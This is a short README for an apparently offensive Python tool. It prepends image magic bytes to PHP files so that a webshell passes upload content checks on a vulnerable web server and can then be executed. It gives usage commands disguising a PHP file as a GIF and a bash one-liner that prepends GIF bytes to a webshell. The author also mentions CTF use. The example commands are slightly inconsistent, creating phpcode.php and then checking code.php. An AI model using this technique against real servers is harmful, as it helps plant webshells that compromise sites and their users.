# magic bitten file

## Purpose

The python script `magic_bitten_file.py` lets you insert the magic bytes of a certain file types of your choosing to be inserted at the beginning of a malicious file (such as a webshell). The file then can be uploaded on a vulnerable web server bypassing any file content checks and executed.

## Usage

This python script does not require anything outside the Python Standard Libray. So all you need to do is execute it.

```bash
# create a php file
printf "%s\n" "<?php phpinfo(); ?>" > phpcode.php

# check what this file is detected as by linux file util
file code.php
code.php: PHP script, ASCII text

# let's make this file a gif file
python3 magic_bitten_file.py -f gif code.php

# let's now see what the linux file util detects this file as
file code.php
code.php: GIF image data, version 87a, 16188 x 26736
```

## Alternatives

Instead of using this script you can take any sample file of your choice from the internet or from your local filesystem and append the code to the end of it. But I found this a bit inconvenient when doing CTFs. With this tool the process is just running a python script.

Here's a bash/zsh one liner to make a php file look like a gif file:
```bash
echo -n -e '\x47\x49\x46\x38\x37\x61' | cat - /path/to/php-webshell.php > image.gif
```
